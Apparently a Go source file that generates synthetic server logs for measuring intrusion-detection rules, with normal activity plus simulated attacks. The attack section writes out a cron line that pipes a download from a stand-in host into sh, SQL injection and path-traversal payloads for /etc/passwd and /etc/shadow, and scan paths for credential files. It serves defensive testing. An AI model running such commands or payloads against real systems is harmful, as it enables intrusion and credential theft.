// Package scenario makes synthetic logs of one day on one small server: ordinary work, and attacks on top.
// Everything is made up. Addresses are from the ranges that are kept for documents (192.0.2.0/24,
// 198.51.100.0/24, 203.0.113.0/24), and no line comes from a real system.
//
// The same seed gives the same logs and the same list of alerts that must fire. This is how detection
// and false positives are measured: by numbers in a test.
//
// The package writes log lines of attacks so that the rules can be tested. It attacks nothing.
package scenario

import (
	"fmt"
	"math/rand"
	"sort"
	"strings"
	"time"
)

// Expected is one alert that the rules must give: the name of the rule, and the value of its group
// (an address or a user). Who is empty for a rule that fires on single events.
type Expected struct {
	Rule string `json:"rule"`
	Who  string `json:"who"`
}

// Scenario is the logs of one day and what must be found in them.
type Scenario struct {
	Files    map[string]string
	Expected []Expected
	// KnownMisses describes attacks that are in the logs and that the built-in rules do not find, by design
	// of their limits. They are here so that the gap is written down and measured, not forgotten.
	KnownMisses []string
}

const host = "web01"

type entry struct {
	at   time.Time
	text string
}

type builder struct {
	random *rand.Rand
	day    time.Time
	auth   []entry
	web    []entry
	pid    int
}

func (b *builder) at(hour, minute, second int) time.Time {
	return b.day.Add(time.Duration(hour)*time.Hour + time.Duration(minute)*time.Minute + time.Duration(second)*time.Second)
}

func (b *builder) syslog(at time.Time, program, message string) {
	b.pid++
	b.auth = append(b.auth, entry{at, fmt.Sprintf("%s %s %s[%d]: %s", at.Format("Jan _2 15:04:05"), host, program, 1000+b.pid%30000, message)})
}

func (b *builder) request(at time.Time, ip, method, url string, status int, agent string) {
	b.web = append(b.web, entry{at, fmt.Sprintf(`%s - - [%s] "%s %s HTTP/1.1" %d %d "-" "%s"`, ip, at.Format("02/Jan/2006:15:04:05 -0700"), method, url, status, 200+b.random.Intn(9000), agent)})
}

func (b *builder) port() int { return 30000 + b.random.Intn(30000) }

func (b *builder) failed(at time.Time, user, ip string, invalid bool) {
	prefix := ""
	if invalid {
		prefix = "invalid user "
	}
	b.syslog(at, "sshd", fmt.Sprintf("Failed password for %s%s from %s port %d ssh2", prefix, user, ip, b.port()))
}

const (
	browser = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15"
	crawler = "Mozilla/5.0 (compatible; ExampleBot/2.1; +http://bot.example.test/about)"
)

// Generate makes the logs of the day. With attacks false it makes only the ordinary work.
// day is the start of the day, and its time zone is the zone of the server.
func Generate(seed int64, day time.Time, attacks bool) Scenario {
	b := &builder{random: rand.New(rand.NewSource(seed)), day: day}
	b.ordinaryLogins()
	b.ordinaryHost()
	b.internetNoise()
	b.ordinaryWeb()

	var result Scenario
	if attacks {
		result.Expected, result.KnownMisses = b.attacks()
	}
	result.Files = map[string]string{"auth.log": join(b.auth), "access.log": join(b.web)}

	return result
}

func join(entries []entry) string {
	sort.SliceStable(entries, func(first, second int) bool { return entries[first].at.Before(entries[second].at) })
	var out strings.Builder
	for _, current := range entries {
		out.WriteString(current.text)
		out.WriteByte('\n')
	}

	return out.String()
}

// ordinaryLogins: four people log in from the office during the day. Some type a wrong password one to
// three times first. That must never be an alert.
func (b *builder) ordinaryLogins() {
	for index, user := range []string{"aiko", "kenji", "mei", "haruto"} {
		ip := fmt.Sprintf("198.51.100.%d", 10+index)
		sessions := 3 + b.random.Intn(4)
		for session := 0; session < sessions; session++ {
			at := b.at(8+session*2-session/2, b.random.Intn(25)+index*7, b.random.Intn(60))
			method := "password"
			if b.random.Intn(2) == 0 {
				method = "publickey"
			}
			if method == "password" && b.random.Intn(3) == 0 {
				for typo := 1 + b.random.Intn(3); typo > 0; typo-- {
					b.failed(at, user, ip, false)
					at = at.Add(time.Duration(4+b.random.Intn(8)) * time.Second)
				}
			}
			suffix := ""
			if method == "publickey" {
				suffix = ": ED25519 SHA256:Zm9yLXRlc3RzLW9ubHktbm90LWEtcmVhbC1rZXk"
			}
			b.syslog(at, "sshd", fmt.Sprintf("Accepted %s for %s from %s port %d ssh2%s", method, user, ip, b.port(), suffix))
			b.syslog(at, "sshd", fmt.Sprintf("pam_unix(sshd:session): session opened for user %s(uid=%d) by (uid=0)", user, 1000+index))
			b.syslog(at.Add(time.Second), "systemd-logind", fmt.Sprintf("New session %d of user %s.", 10+session*4+index, user))
			if b.random.Intn(2) == 0 {
				command := []string{"/usr/bin/systemctl status nginx", "/usr/bin/apt update", "/usr/bin/journalctl -u nginx -n 50", "/usr/bin/tail -n 100 /var/log/nginx/error.log"}[b.random.Intn(4)]
				b.syslog(at.Add(time.Duration(20+b.random.Intn(200))*time.Second), "sudo", fmt.Sprintf("   %s : TTY=pts/%d ; PWD=/home/%s ; USER=root ; COMMAND=%s", user, index, user, command))
			}
		}
	}
}

func (b *builder) ordinaryHost() {
	for hour := 0; hour < 24; hour++ {
		b.syslog(b.at(hour, 17, 1), "CRON", "(root) CMD (   cd / && run-parts --report /etc/cron.hourly)")
	}
	b.syslog(b.at(3, 0, 1), "CRON", "(backup) CMD (/usr/local/bin/backup.sh && curl -fsS -m 10 https://hc.example.test/ping/backup > /dev/null)")
	b.syslog(b.at(6, 25, 1), "CRON", "(root) CMD (test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; })")
}

func (b *builder) internetNoise() {
	for index := 0; index < 30; index++ {
		ip := fmt.Sprintf("192.0.2.%d", 20+index)
		at := b.at(0, index*45+b.random.Intn(10), b.random.Intn(60))
		for try := 1 + b.random.Intn(4); try > 0; try-- {
			user := []string{"root", "admin", "ubuntu", "test"}[b.random.Intn(4)]
			if user != "root" {
				b.syslog(at, "sshd", fmt.Sprintf("Invalid user %s from %s port %d", user, ip, b.port()))
			}
			b.failed(at, user, ip, user != "root")
			at = at.Add(time.Duration(2+b.random.Intn(10)) * time.Second)
		}
		b.syslog(at, "sshd", fmt.Sprintf("Connection closed by %s port %d [preauth]", ip, b.port()))
	}
}

func (b *builder) ordinaryWeb() {
	pages := []string{"/", "/about", "/blog/", "/blog/how-to-sleep-better", "/blog/environment-tips", "/static/app.js?v=3", "/static/site.css",
		"/api/items?page=2", "/search?q=student+union+selection+results", "/search?q=select+a+plan", "/contact", "/docs/../index.html", "/login", "/pricing"}
	for index := 0; index < 500; index++ {
		at := b.at(7+b.random.Intn(15), b.random.Intn(60), b.random.Intn(60))
		ip := fmt.Sprintf("198.51.100.%d", 20+b.random.Intn(60))
		switch b.random.Intn(25) {
		case 0:
			b.request(at, ip, "GET", "/favicon.ico", 404, browser)
		case 1:
			b.request(at, ip, "POST", "/login", 302, browser)
		default:
			b.request(at, ip, "GET", pages[b.random.Intn(len(pages))], 200, browser)
		}
	}
	for minute := 0; minute < 24*60; minute += 5 {
		b.request(b.at(0, minute, 3), "198.51.100.5", "GET", "/healthz", 200, "curl/8.5.0")
	}
	for index := 0; index < 20; index++ {
		b.request(b.at(10, index*3, b.random.Intn(60)), "198.51.100.200", "GET", fmt.Sprintf("/old/page-%d.html", index), 404, crawler)
	}
}

func (b *builder) attacks() ([]Expected, []string) {
	var expected []Expected

	// 1. Password guessing for root, then a login, then two ways to come back: a new account and a cron job.
	attacker := "203.0.113.9"
	at := b.at(2, 10, 0)
	for try := 0; try < 40; try++ {
		b.failed(at, "root", attacker, false)
		at = at.Add(time.Duration(1+b.random.Intn(3)) * time.Second)
	}
	b.syslog(at, "sshd", fmt.Sprintf("Accepted password for root from %s port %d ssh2", attacker, b.port()))
	b.syslog(at, "sshd", "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)")
	b.syslog(at.Add(3*time.Minute), "useradd", "new user: name=support2, UID=1004, GID=1004, home=/home/support2, shell=/bin/bash, from=/dev/pts/1")
	b.syslog(at.Add(3*time.Minute+5*time.Second), "usermod", "add 'support2' to group 'sudo'")
	b.syslog(at.Add(5*time.Minute), "crontab", "(root) REPLACE (root)")
	for run := 0; run < 3; run++ {
		b.syslog(b.at(2, 30+run*30, 1), "CRON", "(root) CMD (curl -fsSL http://203.0.113.80/u.sh | sh)")
	}
	expected = append(expected, Expected{"ssh_brute_force", attacker}, Expected{"ssh_brute_force_success", attacker},
		Expected{"linux_user_created", ""}, Expected{"linux_cron_download_exec", ""})

	// 2. Password spraying: one try for each of twelve user names.
	sprayer := "203.0.113.50"
	at = b.at(11, 30, 0)
	for _, user := range []string{"admin", "deploy", "git", "oracle", "postgres", "jenkins", "ftpuser", "ubuntu", "www", "nagios", "tomcat", "guest"} {
		b.syslog(at, "sshd", fmt.Sprintf("Invalid user %s from %s port %d", user, sprayer, b.port()))
		b.failed(at, user, sprayer, true)
		at = at.Add(time.Duration(10+b.random.Intn(6)) * time.Second)
	}
	expected = append(expected, Expected{"ssh_password_spray", sprayer}, Expected{"ssh_brute_force", sprayer})

	at = b.at(13, 5, 0)
	for index := 0; index < 10; index++ {
		ip := fmt.Sprintf("203.0.113.%d", 101+index)
		b.failed(at, "deploy", ip, false)
		b.failed(at.Add(4*time.Second), "deploy", ip, false)
		at = at.Add(time.Duration(15+b.random.Intn(10)) * time.Second)
	}
	expected = append(expected, Expected{"ssh_distributed_guessing", "deploy"})

	slow := "203.0.113.60"
	for try := 0; try < 48; try++ {
		b.failed(b.at(20, 0, 0).Add(time.Duration(try*150)*time.Second), "root", slow, false)
	}
	misses := []string{"slow SSH password guessing from " + slow + ": 48 tries, one every 150 seconds, stays under the limit of ssh_brute_force"}

	// 5. A web scan with a known tool: files that should not be public, and many paths that do not exist.
	scanner := "203.0.113.77"
	agent := "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"
	at = b.at(14, 0, 0)
	for _, path := range []string{"/.env", "/.git/config", "/.aws/credentials", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/index.php", "/backup.sql",
		"/config.php.bak", "/.DS_Store", "/actuator/env", "/cgi-bin/test.cgi", "/.ssh/id_rsa", "/.git/HEAD"} {
		b.request(at, scanner, "GET", path, 404, agent)
		at = at.Add(time.Duration(1+b.random.Intn(2)) * time.Second)
	}
	b.request(at, scanner, "GET", "/server-status", 403, agent)
	for index := 0; index < 35; index++ {
		at = at.Add(time.Duration(1+b.random.Intn(2)) * time.Second)
		b.request(at, scanner, "GET", fmt.Sprintf("/%s%d.php", []string{"admin", "test", "old", "tmp", "shell"}[b.random.Intn(5)], index), 404, agent)
	}
	expected = append(expected, Expected{"web_sensitive_scan", scanner}, Expected{"web_scanner_tool", scanner}, Expected{"web_path_enumeration", scanner})

	// 6. Injection attempts with the user agent of a browser, and then a refused sudo by the web server's user.
	injector := "203.0.113.88"
	at = b.at(16, 20, 0)
	for _, url := range []string{"/api/items?id=1%27", "/api/items?id=1+UNION+SELECT+NULL,NULL--", "/api/items?id=1%20union%20all%20select%20username,password%20from%20users",
		"/api/items?id=1+AND+SLEEP(5)", "/api/items?id=1%27+OR+%271%27=%271", "/download?file=../../../../etc/passwd", "/download?file=..%2f..%2f..%2fetc%2fshadow",
		"/api/items?id=-1+union+select+table_name+from+information_schema.tables"} {
		b.request(at, injector, "GET", url, []int{200, 500}[b.random.Intn(2)], browser)
		at = at.Add(time.Duration(5+b.random.Intn(20)) * time.Second)
	}
	b.syslog(at.Add(4*time.Minute), "sudo", "www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash")
	expected = append(expected, Expected{"web_injection_attempt", injector}, Expected{"linux_sudo_refused", ""})

	return expected, misses
}
